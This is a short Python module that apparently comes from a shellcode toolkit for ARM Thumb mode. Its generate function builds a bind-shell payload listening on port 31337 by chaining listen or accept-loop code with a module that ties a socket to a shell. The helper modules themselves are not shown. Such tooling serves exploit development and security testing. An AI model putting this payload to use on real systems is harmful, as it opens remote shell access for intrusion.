import listen
import acceptloop
import dupsh
from socket import *

def generate(port=31337, sock=4, version=3, once=1):
    """bind shell on specific port in Thumb Mode

    Args:
        port(int): specific port
        
        sock(int/str/reg): connection sock will be mapped with shell
        
        version(int): 2 is old linux kernel including 2.x (default: 3)

        once(int): binds on port infinity if 1
                       binds on port once if 0
    """

    if int(once) == 1:
        sc = listen.generate(int(port), version)
    else:
        sc = acceptloop.generate(int(port), version)

    sc += dupsh.generate(int(sock))

    return sc
